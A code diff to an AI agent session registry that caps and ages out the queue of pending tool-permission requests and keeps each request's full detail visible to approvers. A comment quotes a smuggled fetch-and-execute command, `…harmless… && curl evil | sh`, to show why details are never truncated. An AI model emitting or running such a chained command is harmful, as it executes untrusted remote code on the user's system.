@@ -11,6 +11,7 @@ import {
   type AgentSession,
   type Backend,
 } from "../adapters";
+import { PERMISSION_TIMEOUT_MS } from "../adapters/types";
 import type { CredentialKind } from "../provider-policy";
 import type { BangProc } from "../pty/pty";
 import { createLogger, verbose } from "../log";
@@ -20,6 +21,15 @@ import { createLogger, verbose } from "../log";
 const BUFFER_CAP = 4000;
 // A session with no viewports survives this long, then dies for real.
 const IDLE_TIMEOUT_MS = Number(process.env.SESSION_IDLE_TIMEOUT_MS ?? 4 * 60 * 60_000);
+// Cap on the fleet's pending-permission MIRROR (2026-07-24 audit): a flooded
+// session — a hostile or steered model spamming permissioned tool calls —
+// must not grow watcher snapshots without bound (500 asks × full detail ≈
+// 1MB to every watcher, up to 10×/s). Oldest evict first: they're closest
+// to the adapter's auto-deny, and an evicted ask stays answerable at the
+// adapter — only the fleet's view of it is dropped; in-session viewports
+// saw its permission_request regardless. Each KEPT entry still carries its
+// full, untruncated detail (the earlier 2026-07-24 audit's rule).
+const PERMISSION_MIRROR_CAP = 25;
 // Ceiling on concurrent sessions: a runaway or hostile local client can't
 // exhaust memory + PTYs by creating without bound. Generous — a human working
 // across projects won't approach it; create() throws past it (the caller turns
@@ -82,11 +92,13 @@ export type SessionEntry = {
   lastBangAt?: number;
   // Phase M cockpit metadata (M.1), derived in broadcast() the same way
   // `status` is: when the session was created (the cockpit's stable sort
-  // key), what it's doing right now, the pending-permission queue (lives as
-  // long as the 4.6 permission hold), and folded session usage.
+  // key), what it's doing right now, the pending-permission queue (each
+  // entry lives until ITS OWN resolution — see captureCockpit), and folded
+  // session usage. `askedAt` mirrors the adapter's auto-deny deadline and
+  // stays server-side (summary() strips it off the wire).
   createdAt: number;
   activity?: { label: string; since: number };
-  permissions: { id: string; tool: string; detail: string }[];
+  permissions: { id: string; tool: string; detail: string; askedAt: number }[];
   usage?: { inputTokens: number; outputTokens: number; costUsd?: number };
 };
 
@@ -212,7 +224,7 @@ export class SessionRegistry {
     } else {
       entry.status = "working";
     }
-    if (this.captureCockpit(entry, msg, prev) || entry.status !== prev) {
+    if (this.captureCockpit(entry, msg) || entry.status !== prev) {
       this.notifyWatchers();
     }
     for (const viewport of entry.viewports) viewport(msg);
@@ -220,15 +232,11 @@ export class SessionRegistry {
 
   /**
    * Cockpit metadata (M.1), derived off the same stream `status` is — runs
-   * AFTER the status derivation (the idle-clear reads the new status) with
-   * `prevStatus` from before it. Returns true when watcher-visible metadata
-   * changed beyond the status flip itself.
+   * AFTER the status derivation (the idle-clears read the new status).
+   * Returns true when watcher-visible metadata changed beyond the status
+   * flip itself.
    */
-  private captureCockpit(
-    entry: SessionEntry,
-    msg: WireMsg,
-    prevStatus: SessionMeta["status"],
-  ): boolean {
+  private captureCockpit(entry: SessionEntry, msg: WireMsg): boolean {
     const prevActivity = entry.activity?.label;
     const prevPending = entry.permissions.length;
     // Activity: what the session is doing right now — `since` resets only
@@ -248,11 +256,13 @@ export class SessionRegistry {
     } else if (entry.status === "idle") {
       entry.activity = undefined;
     }
-    // The pending-permission queue lives exactly as long as the 4.6 hold:
-    // cleared the moment the stream moves off "permission". (A second
-    // concurrently-pending request that outlives the first answer re-surfaces
-    // only via its own timeout — the documented v1 honesty bound, the same
-    // one the status dot already has.)
+    // Each pending permission lives until ITS OWN resolution: an answer
+    // (grid or in-session — both route through answerPermission), the
+    // adapter's auto-deny timeout (mirrored by askedAt below), or the turn
+    // reaching a terminal state. The stream merely MOVING must not clear the
+    // queue — with concurrent requests, the first answer's tool output used
+    // to wipe the still-pending rest off the fleet forever (the 2026-07-24
+    // bug; previously documented as a v1 honesty bound).
     if (msg.type === "permission_request") {
       // The FULL detail — never truncated. Grid allow/deny is a real
       // approval decision, so the fleet approver must see exactly what the
@@ -260,9 +270,23 @@ export class SessionRegistry {
       // (`…harmless… && curl evil | sh`) past a benign head (2026-07-24
       // audit). The detail already reaches every viewport in the original
       // permission_request; copying it whole here leaks nothing new.
-      entry.permissions.push({ id: msg.id, tool: msg.tool, detail: msg.detail });
-    } else if (prevStatus === "permission") {
+      entry.permissions.push({ id: msg.id, tool: msg.tool, detail: msg.detail, askedAt: Date.now() });
+      if (entry.permissions.length > PERMISSION_MIRROR_CAP) {
+        // At-cap eviction keeps the length constant, so the changed-metadata
+        // check below stays false and the notify storm is damped too — a
+        // flood past the cap stops fanning snapshots to watchers entirely.
+        entry.permissions = entry.permissions.slice(-PERMISSION_MIRROR_CAP);
+      }
+    } else if (entry.status === "idle") {
+      // turn_end / error / bang_end: nothing can still be pending.
       entry.permissions = [];
+    } else if (entry.permissions.length) {
+      // The adapter auto-denies an unanswered ask at PERMISSION_TIMEOUT_MS
+      // with no stream event marking it — age the mirror out on the same
+      // clock so the row never advertises an ask that can no longer be
+      // answered. (A stale answer is a no-op at the adapter regardless.)
+      const cutoff = Date.now() - PERMISSION_TIMEOUT_MS;
+      entry.permissions = entry.permissions.filter((p) => p.askedAt > cutoff);
     }
     if (msg.type === "usage") entry.usage = foldUsage(entry.usage, msg);
     return (
@@ -355,8 +379,9 @@ export class SessionRegistry {
         // snapshot must not alias entry state, and old clients strip fields
         // they don't know rather than seeing empty placeholders.
         ...(e.activity ? { activity: { ...e.activity } } : {}),
+        // askedAt stays server-side — the wire shape is unchanged (M.1).
         ...(e.permissions.length
-          ? { permissions: e.permissions.map((p) => ({ ...p })) }
+          ? { permissions: e.permissions.map(({ id, tool, detail }) => ({ id, tool, detail })) }
           : {}),
         ...(e.usage ? { usage: { ...e.usage } } : {}),
       }))
@@ -386,11 +411,13 @@ export class SessionRegistry {
   // turns that into an error reply, never a crash. The relay gate for the
   // acts that drive the model lives in connection.ts, beside its attach twin.
 
-  /** Answer a session's pending permission from the grid. The answered id is
-   *  dropped from the queue immediately (honest feedback before the stream
-   *  moves — the allowed tool may take a moment to start); a concurrently
-   *  pending second request stays visible. A stale id is a no-op at the
-   *  adapter, exactly as on the in-session path. */
+  /** Answer a session's pending permission — BOTH answer paths land here:
+   *  the grid's answer_permission and the in-session permission_response
+   *  (connection.ts routes it through, so the queue and the watchers stay
+   *  in sync with the adapter). The answered id is dropped from the queue
+   *  immediately (honest feedback before the stream moves — the allowed
+   *  tool may take a moment to start); a concurrently pending second
+   *  request stays visible. A stale id is a no-op at the adapter. */
   answerPermission(id: string, permissionId: string, allow: boolean): boolean {
     const entry = this.entries.get(id);
     if (!entry) return false;
